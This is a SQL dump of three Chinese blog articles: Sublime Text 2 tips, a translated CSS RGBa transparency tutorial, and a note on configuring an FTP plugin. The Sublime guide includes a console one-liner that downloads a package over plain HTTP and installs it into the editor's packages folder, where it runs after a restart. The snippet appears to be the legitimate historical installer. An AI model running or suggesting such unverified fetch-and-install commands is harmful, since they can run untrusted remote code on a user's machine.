(46, 46, '&lt;h1 class=&quot;entry-title&quot;&gt;&lt;span style=&quot;font-size:20px;&quot;&gt;Sublime Text 2 入门及技巧&lt;/span&gt;&lt;/h1&gt;&lt;h3 id=&quot;icon&quot;&gt;&lt;a name=&quot;t2&quot;&gt;&lt;/a&gt;&lt;span style=&quot;font-size:16px;&quot;&gt;下载：&lt;/span&gt;&lt;a style=&quot;font-size:16px;text-decoration:underline;&quot; target=&quot;_blank&quot; href=&quot;http://www.sublimetext.com/2&quot;&gt;&lt;span style=&quot;font-size:16px;&quot;&gt;http://www.sublimetext.com/2&lt;/span&gt;&lt;/a&gt;&lt;br /&gt;&lt;/h3&gt;&lt;h3 id=&quot;icon&quot;&gt;&lt;a name=&quot;t3&quot;&gt;&lt;/a&gt;&lt;br /&gt;&lt;/h3&gt;&lt;h3 id=&quot;icon&quot;&gt;&lt;a name=&quot;t4&quot;&gt;&lt;/a&gt;&lt;span style=&quot;font-size:18px;&quot;&gt;换个耐看点些的图标&lt;/span&gt;&lt;/h3&gt;&lt;p&gt;Mac 下的替换方法：&lt;/p&gt;&lt;ul class=&quot; list-paddingleft-2&quot;&gt;&lt;li&gt;&lt;p&gt;在 &lt;code&gt;应用程序&lt;/code&gt; 目录中找到 Sublime Text 2，按住 Ctrl 并点击之，在弹出的菜单中选择&ldquo;显示包内容&rdquo;。&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;进入 &lt;code&gt;Contents/Resources/&lt;/code&gt; 目录，用新下载的图标替换 &lt;code&gt;Sublime Text 2.icns&lt;/code&gt;。&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;图标：&lt;a target=&quot;_blank&quot; href=&quot;http://lucifr.com/2012/01/14/more-sublime-text-2-replacement-icons/&quot;&gt;http://lucifr.com/2012/01/14/more-sublime-text-2-replacement-icons/&lt;/a&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;h3 id=&quot;dev&quot;&gt;&lt;a name=&quot;t5&quot;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;h3 id=&quot;command&quot;&gt;&lt;a name=&quot;t6&quot;&gt;&lt;/a&gt;&lt;span style=&quot;font-size:18px;&quot;&gt;快捷的命令面板&lt;/span&gt;&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/uploads/Image/201312/11/1386777154_cxgsw5_1537_1342860417_2866.png&quot; title=&quot;1342860417_2866.png&quot; /&gt;&lt;/p&gt;&lt;p&gt;和 TextMate 类似，Sublime Text 2 也提供了很方便的命令调用方式：Command Palette（命令面板）。调用方法：直接在 &lt;code&gt;Tool&lt;/code&gt; 菜单中选择 &lt;code&gt;Command Palette&lt;/code&gt;，或是用快捷键：&lt;code&gt;Shift + Command + P&lt;/code&gt;，输入命令名称（中的字母）就可以实时搜索到相应的命令、选项、snippet 和 syntex， 按下回车就可以直接执行，减少了查找的麻烦。&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;h3 id=&quot;file_switch&quot;&gt;&lt;a name=&quot;t7&quot;&gt;&lt;/a&gt;即时的文件切换&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/uploads/Image/201312/11/1386777217_mc2a79_3272_1342862220_5138.png&quot; title=&quot;1342862220_5138.png&quot; /&gt;&lt;/p&gt;&lt;p&gt;按下 &lt;code&gt;Command + P&lt;/code&gt;(Mac) 或是 &lt;code&gt;Ctrl + P&lt;/code&gt;(Windows)，输入想要切换到的文件的文件名，都不用按下回车键，目标文件就已经展现在眼前了，虽然 Vim 配合 PeepOpen 也可以实现同样的功能，但速度却远没有这么迅速。&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;h3 id=&quot;goto_everything&quot;&gt;&lt;a name=&quot;t8&quot;&gt;&lt;/a&gt;随心所欲的跳转&lt;/h3&gt;&lt;p&gt;&lt;code&gt;Cmd+P&lt;/code&gt; 之所以被叫做 Goto Anything 并不是虚名：&lt;/p&gt;&lt;ul class=&quot; list-paddingleft-2&quot;&gt;&lt;li&gt;&lt;p&gt;用 &lt;code&gt;Command+P&lt;/code&gt; 可以快速跳转到当前项目中的任意文件，可进行关键词匹配。&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;用 &lt;code&gt;Command+P&lt;/code&gt; 后 &lt;code&gt;@&lt;/code&gt; (或是&lt;code&gt;Command+R&lt;/code&gt;)可以快速列出/跳转到某个函数（很爽的是在 markdown 当中是匹配到标题，而且还是带缩进的！）。&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;用 &lt;code&gt;Command+P&lt;/code&gt; 后 &lt;code&gt;#&lt;/code&gt; 可以在当前文件中进行搜索。&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;用 &lt;code&gt;Command+P&lt;/code&gt; 后 &lt;code&gt;:&lt;/code&gt; (或是&lt;code&gt;Ctrl+G&lt;/code&gt;)加上数字可以跳转到相应的行。&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;而更酷的是你可以用 &lt;code&gt;Command+P&lt;/code&gt; 加上一些关键词跳转到某个文件同时加上 &lt;code&gt;@&lt;/code&gt; 来列出/跳转到目标文件中的某个函数，或是同时加上&lt;code&gt;#&lt;/code&gt; 来在目标文件中进行搜索，或是同时加上 &lt;code&gt;:&lt;/code&gt; 和数字来跳转到目标文件中相应的行。&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h3 id=&quot;multi-selection&quot;&gt;&lt;a name=&quot;t9&quot;&gt;&lt;/a&gt;&lt;br /&gt;&lt;/h3&gt;&lt;h3 id=&quot;multi-selection&quot;&gt;&lt;a name=&quot;t10&quot;&gt;&lt;/a&gt;多重选择(Multi-Selection)&lt;/h3&gt;&lt;p&gt;多重选择功能允许在页面中同时存在多个光标，让很多本来需要正则表达式、高级搜索和替换才能完成的任务也变得游刃有余了。看看 Nettut+ 提供的实例可能更为直观一些：&lt;/p&gt;&lt;p&gt;激活多重选择的方法有&lt;span style=&quot;text-decoration:line-through;&quot;&gt;两&lt;/span&gt;几种：&lt;/p&gt;&lt;ul class=&quot; list-paddingleft-2&quot;&gt;&lt;li&gt;&lt;p&gt;按住 &lt;code&gt;Command&lt;/code&gt; 或 &lt;code&gt;Alt&lt;/code&gt;，然后在页面中希望中现光标的位置点击。&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;选择数行文本，然后按下 &lt;code&gt;Shift + Command + L&lt;/code&gt;。&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;通过反复按下 &lt;code&gt;Control/Command + D&lt;/code&gt; 即可将全文中与光标当前所在位置的词相同的词逐一加入选择，而直接按下 &lt;code&gt;Alt+F3&lt;/code&gt;(Windows) 或是 &lt;code&gt;Ctrl+Command+G&lt;/code&gt;(Mac) 即可一次性选择所有相同的词。&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;按下鼠标中键来进行垂直方向的纵列选择，也可以进入多重编辑状态。&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h3 id=&quot;indent_guide&quot;&gt;&lt;a name=&quot;t11&quot;&gt;&lt;/a&gt;&lt;br /&gt;&lt;/h3&gt;&lt;h3 id=&quot;indent_guide&quot;&gt;&lt;a name=&quot;t12&quot;&gt;&lt;/a&gt;缩进指示(Indent Guide)&lt;/h3&gt;&lt;blockquote&gt;&lt;p&gt;&lt;strong&gt;更新&lt;/strong&gt;：缩进指示已经被集成进 Sublime Text 2 中，不需要安装插件了。&lt;/p&gt;&lt;/blockquote&gt;&lt;p&gt;缩进指示这个小功能可以让代码的层级关系更加清晰，在 Sublime Text 2 中，可以通过一个插件来实现这个功能。&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/uploads/Image/201312/11/1386777252_t54y3l_3046_1342862362_3016.jpg&quot; title=&quot;1342862362_3016.jpg&quot; /&gt;&lt;/p&gt;&lt;p&gt;安装方法：&lt;/p&gt;&lt;ul class=&quot; list-paddingleft-2&quot;&gt;&lt;li&gt;&lt;p&gt;下载 &lt;a href=&quot;https://github.com/SublimeText/IndentGuides&quot;&gt;IndentGuides&lt;/a&gt; 插件。&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;解压后，将文件夹重命名为 &lt;code&gt;Indent Guides&lt;/code&gt;，并放入 &lt;code&gt;Packages&lt;/code&gt; 目录中。找到 &lt;code&gt;Packages&lt;/code&gt; 目录的简单方法是在 Sublime Text 2 的 &lt;code&gt;Preferences&lt;/code&gt; 菜单中选择 &lt;code&gt;Browse Packages&lt;/code&gt;。&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;重启 Sublime Text 2&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h3 id=&quot;package_control&quot;&gt;&lt;a name=&quot;t13&quot;&gt;&lt;/a&gt;&lt;br /&gt;&lt;/h3&gt;&lt;h3 id=&quot;package_control&quot;&gt;&lt;a name=&quot;t14&quot;&gt;&lt;/a&gt;安装包控制(Package Control) &lt;/h3&gt;&lt;p&gt;上一条中的安装插件的方法是不是很麻烦呢？其实和 TextMate 可安装 Bundle、Plugin 一样，Sublime Text 2 也拥有良好的扩展功能，这就是安装包(Package)；同样，就像 TextMate 有用来安装、升级、卸载 Bundle 的 GetBundles 一样，Sublime Text 2 也有其用来进行 Package 控制的插件：&lt;a href=&quot;http://wbond.net/sublime_packages/package_control&quot;&gt;Sublime Package Control&lt;/a&gt;。通过 Sublime Package Control，安装、升级和卸载 Package 也变得轻松写意了。&lt;/p&gt;&lt;p&gt;安装 Package Control 的方法：&lt;/p&gt;&lt;ul class=&quot; list-paddingleft-2&quot;&gt;&lt;li&gt;&lt;p&gt;打开 Sublime Text 2，按下 &lt;code&gt;Control + `&lt;/code&gt; 调出 Console&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;将以下代码粘贴进命令行中并回车：&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;&lt;pre class=&quot;brush:python;toolbar:false;&quot;&gt;import urllib2,os;pf=&#039;Package Control.sublime-package&#039;;ipp=sublime.installed_packages_path();os.makedirs(ipp) if not os.path.exists(ipp) else None;open(os.path.join(ipp,pf),&#039;wb&#039;).write(urllib2.urlopen(&#039;http://sublime.wbond.net/&#039;+pf.replace(&#039; &#039;,&#039;%20&#039;)).read())&lt;/pre&gt;&lt;ul class=&quot; list-paddingleft-2&quot;&gt;&lt;li&gt;&lt;p&gt;重启 Sublime Text 2，如果在 &lt;code&gt;Preferences -&amp;gt; Package Settings&lt;/code&gt;中见到&lt;code&gt;Package Control&lt;/code&gt;这一项，就说明安装成功了。&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;使用 Package Control 安装 Package 的方法将在后面用到的地方详述。&lt;/p&gt;&lt;h3 id=&quot;alignment&quot;&gt;&lt;a name=&quot;t15&quot;&gt;&lt;/a&gt;对齐&lt;/h3&gt;&lt;p&gt;对于某些喜欢整齐的码农来说，看到下面这种情况可能是让其无法忍受的：&lt;/p&gt;&lt;pre&gt;&lt;code&gt;var joe = &amp;#39;joe&amp;#39;;var johnny = &amp;#39;johnny&amp;#39;;var quaid = &amp;#39;quaid&amp;#39;;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;一定要改成这样才会安心：&lt;/p&gt;&lt;pre&gt;&lt;code&gt;var joe &amp;nbsp; &amp;nbsp;= &amp;#39;joe&amp;#39;;var johnny = &amp;#39;johnny&amp;#39;;var quaid &amp;nbsp;= &amp;#39;quaid&amp;#39;;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;TextMate 里也有这样的功能(&lt;code&gt;Option + Command + ]&lt;/code&gt;)可以自动实现以上的对齐过程，而在 Sublime Text 2 之中，一个&lt;a href=&quot;http://wbond.net/sublime_packages/alignment&quot;&gt;Sublime Alignment&lt;/a&gt; 插件也可以轻松实现。&lt;/p&gt;&lt;p&gt;以下就通过 Package Control 来安装这个插件：&lt;/p&gt;&lt;ol class=&quot; list-paddingleft-2&quot;&gt;&lt;li&gt;&lt;p&gt;按下 &lt;code&gt;Shift + Command + P&lt;/code&gt; 调出命令面板。&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;输入 &lt;code&gt;install&lt;/code&gt; 调出 &lt;code&gt;Package Control: Install Package&lt;/code&gt; 选项，按下回车。&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;在列表中找到 &lt;code&gt;Alignment&lt;/code&gt;，按下回车进行安装。&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;重启 Sublime Text 2 使之生效。现在通过选中文本并按下 &lt;span style=&quot;text-decoration:line-through;&quot;&gt;Shift + Command + A&lt;/span&gt;&lt;code&gt;Ctrl + Command + A&lt;/code&gt; 就可以进行对齐操作了。&lt;br /&gt;&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;通过这个方法就可以简便的安装更多的插件，虽然目前的安装源中插件并不是很多，但相信以后会更加丰富的。&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;h3 id=&quot;vim_mode&quot;&gt;&lt;a name=&quot;t16&quot;&gt;&lt;/a&gt;Vim 模式&lt;/h3&gt;&lt;p&gt;是的，Sublime Text 2 dev 版已经支持 Vim 的编辑模式了，如果更喜欢 Vim 的编辑模式，可以通过以下方法来激活 Vintage mode：&lt;/p&gt;&lt;ol class=&quot; list-paddingleft-2&quot;&gt;&lt;li&gt;&lt;p&gt;按下 &lt;code&gt;Shift + Command + P&lt;/code&gt; 调出命令面板。&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;输入 &lt;code&gt;settings user&lt;/code&gt; 调出 &lt;code&gt;Preferences：Settings - User&lt;/code&gt;，并按下回车。&lt;/p&gt;&lt;blockquote&gt;&lt;p&gt;以上两步也可以直接用&lt;code&gt;cmd + ,&lt;/code&gt;完成。&lt;/p&gt;&lt;/blockquote&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;这时会打开一个 Preferences.sublime-settings 的文件，如果是第一次修改，它应该是个空文件，把以下文本粘贴进去：&lt;/p&gt;&lt;pre&gt;&lt;code&gt;{ &amp;nbsp; &amp;nbsp;&amp;quot;ignored_packages&amp;quot;: []}&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;保存这个文件，这时按下 ESC 键，再按下一些你熟悉的 Vim 命令，是不是很有亲切感？&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;h3 id=&quot;distraction_free&quot;&gt;&lt;a name=&quot;t17&quot;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;h3 id=&quot;distraction_free&quot;&gt;&lt;br /&gt;&lt;/h3&gt;&lt;h3 id=&quot;distraction_free&quot;&gt;无干扰模式(Distraction Free Mode)&lt;/h3&gt;&lt;p&gt;现在的编辑器如果没有一个无干扰模式似乎都说不过去了，在 Sublime Text 2 中，只要按下 &lt;code&gt;Control + Shift + Command + F&lt;/code&gt; 或是在菜单&lt;code&gt;View&lt;/code&gt; 中选择 &lt;code&gt;Enter Distraction Free Mode&lt;/code&gt; 就可以进入这个 UI 最小化模式了。如果是在用 Mac OS X Lion 的话，Sublime Text 2 还同时支持 Lion 的原生全屏模式。&lt;/p&gt;&lt;p&gt;通过修改 &ldquo;Preferences&rdquo; -&amp;gt; &ldquo;File Settings - More&rdquo; -&amp;gt; &ldquo;Distraction Free - User&rdquo; 可以对防干扰模式进行一些设置：&lt;/p&gt;&lt;pre class=&quot;brush:plain;toolbar:false;&quot;&gt;{\r\n    &quot;line_numbers&quot;: false,      //是否显示行号\r\n    &quot;gutter&quot;: false,            //是否显示边列\r\n    &quot;draw_centered&quot;: true,      //是否居中显示\r\n    &quot;wrap_width&quot;: 80,           //换行宽度(单位：字符)\r\n    &quot;word_wrap&quot;: true,          //是否自动换行\r\n    &quot;scroll_past_end&quot;: true     //滚动能否超过结尾\r\n}&lt;/pre&gt;&lt;h3 id=&quot;bundle&quot;&gt;&lt;br /&gt;&lt;/h3&gt;&lt;h3 id=&quot;bundle&quot;&gt;TextMate Bundle&lt;/h3&gt;&lt;p&gt;Sublime Text 2 很给力的一点就是它同时支持&lt;strong&gt;一些&lt;/strong&gt; TextMate 的 Bundle。&lt;br /&gt;&lt;/p&gt;&lt;p&gt;Sublime Text 2 对于 TextMate Bundle 中的 Snippet 有着良好的原生支持，把 Bundle 放到 Packages 目录里就能用。但对 Bundle 中的 command 并不支持，此外，&lt;a href=&quot;http://textmatetheme.com/&quot;&gt;TextMate 的色彩主题&lt;/a&gt;&lt;sup id=&quot;refBody1&quot;&gt;&lt;a href=&quot;http://lucifr.com/139225/sublime-text-2-tricks-and-tips/#refAnchor1&quot;&gt;[1]&lt;/a&gt;&lt;/sup&gt; 也是可以放到 Packages 目录里直接用的。估计随着 Sublime Text 2 越来越火，会有更多 TextMate 的 Bundle 被移植过来。&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;h3 id=&quot;theme&quot;&gt;&lt;a name=&quot;t19&quot;&gt;&lt;/a&gt;主题&lt;/h3&gt;&lt;p&gt;这里所讲的主题不同于针对代码的 Color Scheme，是指针对 Sublime 程序本身的主题，目前可以安装的是 Ian Hill 的 &lt;a href=&quot;https://github.com/buymeasoda/soda-theme&quot;&gt;Soda&lt;/a&gt;。&lt;/p&gt;&lt;p&gt;因为源中已经添加，所以这款主题的安装同样可以通过 Package Control，非常方便。目前 Soda 主题提供了明暗两种风格。&lt;/p&gt;&lt;p&gt;激活方法，同样要修改 Preferences：Settings - User：&lt;/p&gt;&lt;ol class=&quot; list-paddingleft-2&quot;&gt;&lt;li&gt;&lt;p&gt;按下 &lt;code&gt;Shift + Command + P&lt;/code&gt; 调出命令面板。&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;输入 &lt;code&gt;user settings&lt;/code&gt; 调出 &lt;code&gt;Preferences：Settings - User&lt;/code&gt;，并按下回车。&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;添加以下代码激活 Soda Light 主题：&lt;/p&gt;&lt;pre&gt;&lt;code&gt;{ &amp;nbsp; &amp;nbsp;&amp;quot;theme&amp;quot;: &amp;quot;Soda Light.sublime-theme&amp;quot;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;添加以下代码激活 Soda Dark 主题：&lt;/p&gt;&lt;pre&gt;&lt;code&gt;{ &amp;nbsp; &amp;nbsp;&amp;quot;theme&amp;quot;: &amp;quot;Soda Dark.sublime-theme&amp;quot;} &lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;保存生效&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;h3 id=&quot;commandline&quot;&gt;&lt;a name=&quot;t20&quot;&gt;&lt;/a&gt;&lt;br /&gt;&lt;/h3&gt;&lt;h3 id=&quot;commandline&quot;&gt;&lt;a name=&quot;t21&quot;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;h3 id=&quot;commandline&quot;&gt;命令行工具&lt;/h3&gt;&lt;p&gt;和 TextMate 和 MacVim 一样，Sublime Text 2 也提供了很方便的&lt;a href=&quot;http://www.sublimetext.com/docs/2/osx_command_line.html&quot; _xhe_href=&quot;http://www.sublimetext.com/docs/2/osx_command_line.html&quot; title=&quot;OS X Command Line - Sublime Text 2 Documentation&quot;&gt;命令行工具&lt;/a&gt;以方便通过终端来快速的调用 Sublime Text 2 程序来打开文件/目录/项目等。&lt;/p&gt;&lt;p&gt;要使用命令行工具，你需要创建一个符号链接，在终端(Terminal.app)中运行：&lt;/p&gt;&lt;pre&gt;&lt;code&gt;ln -s &amp;quot;/Applications/Sublime Text 2.app/Contents/SharedSupport/bin/subl&amp;quot; ~/bin/subl&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;然后运行 &lt;code&gt;subl --help&lt;/code&gt; 可以查看 &lt;code&gt;subl&lt;/code&gt; 命令的使用方法：&lt;/p&gt;&lt;pre class=&quot;brush:plain;toolbar:false;&quot;&gt;使用:  subl [参数] [文件]         编辑指定文件\r\n   或: subl [参数] [目录]            打开指定目录\r\n   或: subl [参数] -             编辑 stdin\r\n可用参数:\r\n  --project &amp;lt;项目&amp;gt;: 读取指定项目\r\n  --command &amp;lt;命令&amp;gt;: 运行指定命令\r\n  -n 或 --new-window:  打开新窗口\r\n  -a 或 --add:         向当前窗口中添加文件夹\r\n  -w 或 --wait:        等待文件关闭后再返回\r\n  -b 或 --background:  不激活程序窗口\r\n  -s 或 --stay:        关闭文件后保持程序窗口激活\r\n  -h 或 --help:        显示此帮助\r\n  -v 或 --version:     显示版本号\r\n读取 stdin 时会使用 --wait 参数。通过 --stay 可以在文件关闭后不返回终端（仅针对单个文件）。\r\n可以通过向文件名添加 `:行号` 或 `:行号:列号` 后缀来打开到更具体的位置。&lt;/pre&gt;&lt;h3 id=&quot;conclusion&quot;&gt;总结&lt;/h3&gt;&lt;p&gt;在试用 Sublime Text 2 的过程中，&ldquo;&lt;strong&gt;快&lt;/strong&gt;&rdquo;和&ldquo;&lt;strong&gt;顺&lt;/strong&gt;&rdquo;是给 Lucifr 最强烈的感受，就如同 Chrome 浏览器一样，Sublime 的各种操作都给人以很流畅的感受。良好的中文支持也是 TextMate 所不具备的，虽然以目前的插件数量和质量还不能完全替代 TextMate，但还是让人十分期待的。唯一让人纠结的是价格，$59 的注册价确实不便宜（明显是照着 TextMate 的 $58 加一块定的嘛），好在目前测试阶段还可以无限试用。&lt;/p&gt;&lt;h3 id=&quot;commandline&quot;&gt;&lt;br /&gt;&lt;/h3&gt;', 1386777562),
(47, 47, '&lt;p&gt;&lt;a href=&quot;http://robertnyman.com/2010/01/11/css-background-transparency-without-affecting-child-elements-through-rgba-and-filters/&quot;&gt;原文&lt;/a&gt;发表于 2010.1.11 shukebeta 翻译&lt;/p&gt;&lt;p&gt;译者按：这篇文章里提到的IE解决方案，还是有一些问题的。且不说IE9既支持RGBa又支持Filter会给我们带来麻烦，过滤器这种东西说不准 啥时候就会导致渲染问题。我建议对支持rgba的浏览器只使用rgba，同时为不支持rgba的浏览器留一个非透明背景的退路。以下为原文译文：&lt;/p&gt;&lt;p&gt;今天的网页设计，几乎毫无例外地包含一些半透明元素，然而，要使用CSS得到需要的效果，需要颇费些思量。&lt;/p&gt;&lt;h2&gt;&lt;a name=&quot;t0&quot;&gt;&lt;/a&gt;问题&lt;/h2&gt;&lt;p&gt;如果我们想要一个元素拥有半透明的背景，我们有两个选择：&lt;/p&gt;&lt;pre&gt;&lt;code&gt;使用CSS和 opacity 做一张 24-bit PNG 背景图片 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;在CSS中使用opacity有两个问题，一是为了适应所有的浏览器，我们要对付opacity讨厌的语法；二是opacity不仅使目标元素的背 景变得半透明，而且使它所有的子元素的背景也变成了半透明。这意味着它里面所有的文本（译者注：图片也一样）都具有同样的透明度，我敢肯定没几个人想要这 样的效果。可以通过添加一些不必要的元素，使用CSS定位技巧类似的手段躲开这个问题，归根结底，乱就一个字。&lt;/p&gt;&lt;p&gt;使用PNG图片也有问题，除了不必要的HTTP请求之外，图片体积再小也比两行CSS代码大－特别是在IE里面，为了避免24-bitPNG图片严重的内存泄漏问题，这张图还必须额外大一点。&lt;/p&gt;&lt;h2&gt;&lt;a name=&quot;t1&quot;&gt;&lt;/a&gt;解决方案！&lt;/h2&gt;&lt;p&gt;综上种种，我愿意很高兴的提供一种替代方案：RGBa颜色。这个方案的优点在于你可以设定正常的RGB颜色值，再加上你想要的透明度，OK，这就得到了半透明的背景色。用CSS写出来，再加上对不支持rgba浏览器的优雅降级，代码如下：&lt;/p&gt;&lt;pre class=&quot;brush:css;toolbar:false;&quot;&gt;.alpha60 {  \r\n/* Fallback for web browsers that doesn&#039;t support RGBa */  \r\nbackground: rgb(0, 0, 0);  \r\n/* RGBa with 0.6 opacity */  \r\nbackground: rgba(0, 0, 0, 0.6);  \r\n}&lt;/pre&gt;&lt;p&gt;半透明效果仅仅应用于背景－确实很妙，是不是？！ :-)&lt;/p&gt;&lt;h2&gt;&lt;a name=&quot;t2&quot;&gt;&lt;/a&gt;提示&lt;/h2&gt;&lt;p&gt;令人震惊的是，所有的IE（译者注：作者写这篇博客时还没有IE9，IE9在标准渲染模式下是支持RGBa的）都不支持RGBa色彩。幸运的 是，2000年疯狂的微软公司在IE中实现了许多过滤器。其中有一个倾斜度过滤器，我们需要做的就是把它的起始颜色和结束颜色定义成同样的值。&ldquo;OK，可 我们要的是透明效果呀？&rdquo;我知道你会这么想。答案是，我们使用16进制颜色值的一部分来声明起始颜色和结束颜色。使用css倾斜度过滤器达到同样效果的代 码如下：&lt;/p&gt;&lt;pre&gt;&lt;code&gt;.alpha60 { filter:progid:DXImageTransform.Microsoft.gradient(startColorstr=#99000000, endColorstr=#99000000); } &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;看到没。它的颜色值使用8位16进制值声明，其中第一第二位是16进制的alpha值 ，后面两位是R，再后面是G，再后面是B。和RGBa不同的是，它使用16进制数而不是0－255的颜色值。那我们怎样才能得到alpha0.6级别的16进制值？&lt;/p&gt;&lt;p&gt;我们现在需要做点算术题。我们需要alpha0.6级，将它乘上255－－再把结果转换成16进制。一个简单方法是使用Google搜索功能，只需 要在关键词那儿写上 0.6 * 255 in hex 就可以了。不幸的是Google的计算器好象只支持整数，象 0.3 * 255 in hex这样的关键字根本得不到结果。&lt;/p&gt;&lt;p&gt;好在，还有一个也不算慢的手段，我们可以利用JavaScript。打开Firebug，然后在JavaScript控制台输入：&lt;/p&gt;&lt;pre&gt;&lt;code&gt;// Replace 0.6 with your desired alpha level Math.floor(0.6 * 255).toString(16); &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;我们得到结果 99，也就是alpha0.6级别对应的16进制数。这就是倾斜度过滤器所需要的起始和结束值。&lt;/p&gt;&lt;h2&gt;&lt;a name=&quot;t3&quot;&gt;&lt;/a&gt;总结&lt;/h2&gt;&lt;p&gt;综合以上技术，我们写一份能在生产环境中使用的CSS：&lt;code&gt;&lt;br /&gt;&lt;/code&gt;&lt;/p&gt;&lt;pre class=&quot;brush:css;toolbar:false;&quot;&gt;.alpha60 {  \r\n/* Fallback for web browsers that doesn&#039;t support RGBa */  \r\nbackground: rgb(0, 0, 0); 如果IE filter无效，注释掉本行代码 \r\n/* RGBa with 0.6 opacity */  \r\nbackground: rgba(0, 0, 0, 0.6); \r\n/* For IE 5.5 - 7*/  \r\nfilter:progid:DXImageTransform.Microsoft.gradient(startColorstr=#99000000, endColorstr=#99000000); \r\n/* For IE 8*/ \r\n-ms-filter: &quot;progid:DXImageTransform.Microsoft.gradient(startColorstr=#99000000, endColorstr=#99000000)&quot;; \r\n}&lt;/pre&gt;&lt;p&gt;注意！作为对本文的补充，你应该使用更可取的条件注释或类似方法为IE浏览器声明透明背景！&lt;/p&gt;&lt;h2&gt;&lt;a name=&quot;t4&quot;&gt;&lt;/a&gt;浏览器支持&lt;/h2&gt;&lt;p&gt;以下浏览器支持 RGBa：&lt;/p&gt;&lt;pre&gt;&lt;code&gt;Firefox 3+ Safari 2+ Opera 10 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;从IE5.5开始，所有的IE浏览器都支持过滤器。&lt;/p&gt;&lt;p&gt;这意味着，我们实际上已经支持所有的浏览器！&lt;/p&gt;&lt;p&gt;鸣谢：&lt;/p&gt;&lt;p&gt;Thanks to RGBa Browser Support and Bulletproof, cross-browser RGBA backgrounds, today for the information and inspiration.&lt;/p&gt;&lt;p&gt;Thanks to Emil Stenstr&ouml;m and Pelle Wessman for coming up with countless alternatives for hex conversion, and explaining basic math to stupid me. :-)&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;转载地址：&lt;a target=&quot;_blank&quot; href=&quot;http://www.cnblogs.com/mizzle/archive/2012/04/05/2432752.html&quot;&gt;http://www.cnblogs.com/mizzle/archive/2012/04/05/2432752.html&lt;/a&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;', 1386777723),
(48, 48, '&lt;p&gt;&lt;span style=&quot;font-size:14px&quot;&gt;&lt;strong&gt;用Package Control安装FTP插件&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt; 按下Ctrl+Shift+P调出命令面板&lt;/p&gt;&lt;p&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;输入install 调出 Install Package 选项并回车，然后输入ftp，下拉列表中会出现一些相关的插件，选中sftp进行安装就行了，装好后还需配置如下：&lt;/p&gt;&lt;p&gt;选菜单栏中的File-&amp;gt;SFTP/FTP-&amp;gt;Set up Server，然后出现一个配置窗口如下&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/uploads/Image/201312/12/1386777841_6sono8_7492_1344306181_8171.png&quot; title=&quot;1344306181_8171.png&quot; /&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;注意是ftp连接的话，要将sftp改成ftp，然后设置主机名，密码，端口就行了，ftp的端口是21。&lt;/p&gt;&lt;p&gt;连接成功的话会有在sublime的底部如下显示，这样链接成功了。。。&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/uploads/Image/201312/12/1386777866_wz4bby_1814_1344306139_2921.png&quot; title=&quot;1344306139_2921.png&quot; /&gt;&lt;/p&gt;', 1386777869),
